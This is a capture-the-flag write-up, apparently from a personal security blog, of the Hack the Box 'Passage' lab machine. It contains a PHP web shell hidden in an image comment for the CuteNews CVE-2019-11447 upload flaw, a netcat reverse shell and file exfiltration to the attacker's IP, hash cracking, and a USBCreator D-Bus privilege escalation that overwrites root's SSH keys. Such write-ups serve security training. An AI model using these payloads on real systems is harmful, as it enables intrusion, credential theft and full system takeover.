@@ -1,0 +1,405 @@
+<!DOCTYPE html>
+<html lang="">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Hack the Box - Passage - HcKy-sec.io</title><meta name="Description" content="Hack the Box Passage Write-up"><meta property="og:title" content="Hack the Box - Passage" />
+<meta property="og:description" content="Hack the Box Passage Write-up" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://hcky-sec.io/passage/" />
+<meta property="og:image" content="https://hcky-sec.io/passage/passage.jpeg"/>
+<meta property="article:published_time" content="2021-03-06T14:00:01+08:00" />
+<meta property="article:modified_time" content="2021-03-06T14:00:01+08:00" />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://hcky-sec.io/passage/passage.jpeg"/>
+<meta name="twitter:title" content="Hack the Box - Passage"/>
+<meta name="twitter:description" content="Hack the Box Passage Write-up"/>
+<meta name="application-name" content="HcKy-sec">
+<meta name="apple-mobile-web-app-title" content="HcKy-sec"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="https://hcky-sec.io/passage/" /><link rel="prev" href="https://hcky-sec.io/academy/" /><link rel="next" href="https://hcky-sec.io/luanne/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hack the Box - Passage",
+        "inLanguage": "",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "https:\/\/hcky-sec.io\/passage\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "https:\/\/hcky-sec.io\/passage\/passage.jpeg",
+                            "width":  800 ,
+                            "height":  638 
+                        }],"genre": "posts","keywords": "Linux, Web, PHP, CVE, HTB","wordcount":  936 ,
+        "url": "https:\/\/hcky-sec.io\/passage\/","datePublished": "2021-03-06T14:00:01+08:00","dateModified": "2021-03-06T14:00:01+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": {
+                    "@type": "ImageObject",
+                    "url": "https:\/\/hcky-sec.io\/images\/avatar3.jpeg",
+                    "width":  1284 ,
+                    "height":  1293 
+                }},"author": {
+                "@type": "Person",
+                "name": "HcKy"
+            },"description": "Hack the Box Passage Write-up"
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="HcKy-sec.io"><span class="header-title-pre"><i class=''></i></span><span id="id-1" class="typeit"></span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/ctf/" title="CTF"> CTF Competitions </a><a class="menu-item" href="/posts/" title="CTF write-ups"> Write-ups </a><a class="menu-item" href="/categories/documentation/"> Docs </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/about/" title="About Me"> About </a><a class="menu-item" href="/">  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="search for stuff" id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="HcKy-sec.io"><span class="header-title-pre"><i class=''></i></span><span id="id-2" class="typeit"></span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="search for stuff" id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/ctf/" title="CTF">CTF Competitions</a><a class="menu-item" href="/posts/" title="CTF write-ups">Write-ups</a><a class="menu-item" href="/categories/documentation/" title="">Docs</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/about/" title="About Me">About</a><a class="menu-item" href="/" title=""></a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Hack the Box - Passage</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>HcKy</a></span>&nbsp;<span class="post-category">included in <a href="/categories/write-ups/"><i class="far fa-folder fa-fw"></i>write-ups</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-03-06">2021-03-06</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;936 words&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;5 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/passage/passage.jpeg"
+        data-srcset="/passage/passage.jpeg, /passage/passage.jpeg 1.5x, /passage/passage.jpeg 2x"
+        data-sizes="auto"
+        alt="/passage/passage.jpeg"
+        title="Hack the Box Passage Write-up" /></div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#1-overview">1. Overview</a></li>
+    <li><a href="#2-recon">2. Recon</a>
+      <ul>
+        <li><a href="#21-nmap">2.1 Nmap</a></li>
+        <li><a href="#22-website">2.2 Website</a>
+          <ul>
+            <li><a href="#221-passage-news">2.2.1 Passage News</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#3-foothold">3. Foothold</a></li>
+    <li><a href="#4-privilege-escalation">4. Privilege Escalation</a>
+      <ul>
+        <li><a href="#41-first-user">4.1 First user</a></li>
+        <li><a href="#42-second-user">4.2 Second User</a></li>
+        <li><a href="#43-root">4.3 Root</a></li>
+      </ul>
+    </li>
+    <li><a href="#conclusion">Conclusion</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><div style="text-align:center">Write-up of Passage - Difficulty : Medium </div>
+<blockquote>
+<p>&ldquo;None shall pass.&rdquo; - &ldquo;I have no quarrel with you, good Sir Knight,
+but I must cross this bridge.&rdquo; - &ldquo;Then you shall die.&rdquo;</p>
+<p>Monty Python and the Holy Grail</p>
+</blockquote>
+<h2 id="1-overview">1. Overview</h2>
+<p>Passage is a Linux box hosting a blog/news website.<br>
+The version of CuteNews installed allows for a file upload to RCE.<br>
+Re-use of account credentials allows for lateral movement in the system.<br>
+The root account is able to be compromised due to an unpatched version of USBCreator.</p>
+<h2 id="2-recon">2. Recon</h2>
+<h3 id="21-nmap">2.1 Nmap</h3>
+<p>As always we start off running a port scan with nmap and we see that ports 22 and 80 are open.
+The http title on 80 is Passage News.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash"> nmap -sC -sV 10.129.108.237
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="nmap.png"
+        data-srcset="/passage/nmap.png, nmap.png 1.5x, /passage/nmap.png 2x"
+        data-sizes="auto"
+        alt="/passage/nmap.png"
+        title="nmap" /></p>
+<h3 id="22-website">2.2 Website</h3>
+<h4 id="221-passage-news">2.2.1 Passage News</h4>
+<p>First thing we need to do is check out the website on port 80.  We can do that by simply browsing to it in Firefox. The site appears to be some type of message board. All the posts are filler text except for the &ldquo;Implemented Fail2Ban&rdquo; post which just states that fail2ban has been installed.  If we run gobuster against this site our IP address will get banned for roughly five minutes.  At the bottom of the page is a reference to CuteNews and a link to their website.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="news.png"
+        data-srcset="/passage/news.png, news.png 1.5x, /passage/news.png 2x"
+        data-sizes="auto"
+        alt="/passage/news.png"
+        title="home" /></p>
+<p>After poking around for a little while and not getting anywhere it&rsquo;s time to look at the documentation for Cute News.  The documentation mentioned a dashboard at <strong>/CuteNews</strong>.</p>
+<p>When we go to that site we&rsquo;re able to register for an account and login.  After some more enumeration there doesn&rsquo;t appear to be much info to grab.  We can see that the version of Cute News running is <strong>2.1.2</strong>.</p>
+<p>After some googling we wind up with <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-11447" target="_blank" rel="noopener noreffer">CVE-2019-11447</a>.</p>
+<h2 id="3-foothold">3. Foothold</h2>
+<p>The CVE we found allows us to upload an image file with php code commented into the image and have the server execute it.  This vulnerability can be used for us to gain a foothold.</p>
+<p>We can use any image file and add a comment with exiftool that allows us to run commands by putting the command in a GET request.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">exiftool -comment<span class="o">=</span><span class="s1">&#39;&lt;?php echo system($_GET[&#39;</span>cmd<span class="s1">&#39;]); ?&gt;&#39;</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>We change the extension to <strong>.php</strong> and upload it as an avatar to the user account that we created earlier.</p>
+<p>With this uploaded we&rsquo;re able to navigate to our file and run some commands, such as <strong>id</strong> to see who we&rsquo;re running commands as and <strong>ls /bin</strong> to see what&rsquo;s installed on the server.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=id
+http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=ls+/bin
+</code></pre></td></tr></table>
+</div>
+</div><br>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="idphp.png"
+        data-srcset="/passage/idphp.png, idphp.png 1.5x, /passage/idphp.png 2x"
+        data-sizes="auto"
+        alt="/passage/idphp.png"
+        title="id" /><br>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="lsbin.png"
+        data-srcset="/passage/lsbin.png, lsbin.png 1.5x, /passage/lsbin.png 2x"
+        data-sizes="auto"
+        alt="/passage/lsbin.png"
+        title="ls" /></p>
+<p>With these commands we can see that we&rsquo;re running as <strong>www-data</strong> and that <strong>nc</strong> and <strong>nc.traditional</strong> are installed on the server.<br>
+Knowing that, we can simply use netcat to call back to a listener we set up on our box.</p>
+<p>We set up our listener with <strong>nc -lvnp 1234</strong> and use the following url encoded command in our browser to connect to it.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">http://10.129.108.237/CuteNews/uploads/avatar_test_passage.php?cmd=nc%2010.10.14.24%201234%20-e%20%2Fbin%2Fbash
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="wwwdata.png"
+        data-srcset="/passage/wwwdata.png, wwwdata.png 1.5x, /passage/wwwdata.png 2x"
+        data-sizes="auto"
+        alt="/passage/wwwdata.png"
+        title="data" /></p>
+<h2 id="4-privilege-escalation">4. Privilege Escalation</h2>
+<h3 id="41-first-user">4.1 First user</h3>
+<p>As usual when a website is running we want to check out <strong>/var/www/html</strong> to see if anything is left there for us to find.  In <strong>/var/www/html/CuteNews/cdata/users</strong> we find bunch of files that have base64 encrypted strings in them. To easily move these to our machine we ran <strong>cat * &gt; hash.txt</strong> and then moved the file over to our box with netcat.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">on attack box
+nc -lvnp <span class="m">2345</span> &gt; hash.txt
+
+on victim box
+nc -w <span class="m">3</span> 10.10.14.24 <span class="m">2345</span> &lt; hash.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="nctransfer.png"
+        data-srcset="/passage/nctransfer.png, nctransfer.png 1.5x, /passage/nctransfer.png 2x"
+        data-sizes="auto"
+        alt="/passage/nctransfer.png"
+        title="nc" /></p>
+<p>Now we just remove extra data from the file and decode the base64 with <strong>cat hash.txt|base64 -d &gt; hash2.txt</strong>.  Once that&rsquo;s complete we can run hashcat against the new hashes we found to see if anything is useful.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-fallback" data-lang="fallback">hashcat -m 1400 -a 0 hash2.txt /opt/SecLists/Passwords/Leaked-Databases/rockyou.txt
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="hashcat.png"
+        data-srcset="/passage/hashcat.png, hashcat.png 1.5x, /passage/hashcat.png 2x"
+        data-sizes="auto"
+        alt="/passage/hashcat.png"
+        title="hash" /></p>
+<p>And since we found a couple passwords let&rsquo;s run <strong>getent passwd</strong> to find our users.  We try the passwords for our users <strong>nadav</strong> and <strong>paul</strong>.  A simple <strong>su</strong> to paul and we have our first user and the user flag in the home directory.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="supaul.png"
+        data-srcset="/passage/supaul.png, supaul.png 1.5x, /passage/supaul.png 2x"
+        data-sizes="auto"
+        alt="/passage/supaul.png"
+        title="paul" /></p>
+<h3 id="42-second-user">4.2 Second User</h3>
+<p>Since we all know that users like to re-use things it&rsquo;s always a good practice to attempt to use what you already have to access other user accounts.  Neither of the passwords seem to work for <strong>nadav</strong> so let&rsquo;s try using <strong>paul&rsquo;s</strong> SSH key to get in.  We copied his private key over with <strong>nc</strong> using the same command as our previous transfer.</p>
+<p>We attempt to SSH in with the key as nadav and we get right in.<br>
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="nadavssh.png"
+        data-srcset="/passage/nadavssh.png, nadavssh.png 1.5x, /passage/nadavssh.png 2x"
+        data-sizes="auto"
+        alt="/passage/nadavssh.png"
+        title="ssh" /></p>
+<h3 id="43-root">4.3 Root</h3>
+<p>Running <strong>groups</strong> as nadav reveals that he&rsquo;s a member of quite a few things.  First thing&rsquo;s first, however, so let&rsquo;s go check out his home directory.  A simple <strong>ls -a</strong> and we find a hidden <strong>.viminfo</strong> file with some useful information in it.</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="viminfo.png"
+        data-srcset="/passage/viminfo.png, viminfo.png 1.5x, /passage/viminfo.png 2x"
+        data-sizes="auto"
+        alt="/passage/viminfo.png"
+        title="vim" /></p>
+<p>Nadav has been making some changes to something called <strong>dbus-1/&hellip;/USBCreator.conf</strong>.  If we do some more googling we wind up at <a href="https://unit42.paloaltonetworks.com/usbcreator-d-bus-privilege-escalation-in-ubuntu-desktop/" target="_blank" rel="noopener noreffer">USCreator Privilege Escalation</a> which should allow use to overwrite arbitrary files on the system without password prompt so long as we are in the sudo group.  Sounds like a plan.<br>
+Instead of copying our key over the victim host we&rsquo;ll just use nadav&rsquo;s since we already have the private key on our attack box.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre class="chroma"><code class="language-bash" data-lang="bash">cat ~/.ssh/id_rsa.pub &gt;&gt; ~/.ssh/authorized_keys
+gdbus call --system --dest com.ubuntu.USBCreator --object-path /com/ubuntu/USBCreator --method com.ubuntu.USBCreator.Image /home/nadav/.ssh/authorized_keys /root/.ssh/authorized_keys <span class="nb">true</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="privescroot.png"
+        data-srcset="/passage/privescroot.png, privescroot.png 1.5x, /passage/privescroot.png 2x"
+        data-sizes="auto"
+        alt="/passage/privescroot.png"
+        title="root" /></p>
+<p>Simple as that we have root access to the box.</p>
+<h2 id="conclusion">Conclusion</h2>
+<ol>
+<li>Ensure your software is up to date.  Both attack vectors could be eliminated by installing required patches or updating to the newest version of the effected software.</li>
+</ol>
+<br>
+<br>
+<br>
+<div style="text-align:center"><a href="https://www.hackthebox.eu/home/users/profile/190484"><img src="https://www.hackthebox.eu/badge/image/190484"></a></div>
+<div style="text-align:center">If this write-up was helpful consider leaving some respect on my HTB profile.</div></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2021-03-06</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/linux/">Linux</a>,&nbsp;<a href="/tags/web/">Web</a>,&nbsp;<a href="/tags/php/">PHP</a>,&nbsp;<a href="/tags/cve/">CVE</a>,&nbsp;<a href="/tags/htb/">HTB</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/academy/" class="prev" rel="prev" title="Hack the Box - Academy"><i class="fas fa-angle-left fa-fw"></i>Hack the Box - Academy</a>
+            <a href="/luanne/" class="next" rel="next" title="Hack the Box - Luanne">Hack the Box - Luanne<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.68.3">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.10"><i class="far fa-kiss-wink-heart fa-fw"></i> LoveIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/css/lightgallery.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/smooth-scroll@16.1.3/dist/smooth-scroll.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.37.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lunr@2.3.8/lunr.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.2.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery.js@1.2.0/dist/js/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-thumbnail.js@1.2.0/dist/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lg-zoom.js@1.2.0/dist/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.6/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/typeit@7.0.4/dist/typeit.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":10},"comment":{},"data":{"id-1":"/home/hcky-sec \u0026nbsp;","id-2":"/home/hcky-sec \u0026nbsp;"},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"lunr"},"typeit":{"cursorChar":"|","cursorSpeed":1000,"data":{"id-1":["id-1"],"id-2":["id-2"]},"duration":-1,"speed":100}};</script><script type="text/javascript" src="/js/theme.min.js"></script><script type="text/javascript">
+            window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments);}gtag('js', new Date());
+            gtag('config', 'G-HESLRD4X4Q', { 'anonymize_ip': true });
+        </script><script type="text/javascript" src="https://www.googletagmanager.com/gtag/js?id=G-HESLRD4X4Q" async></script></body>
+</html>
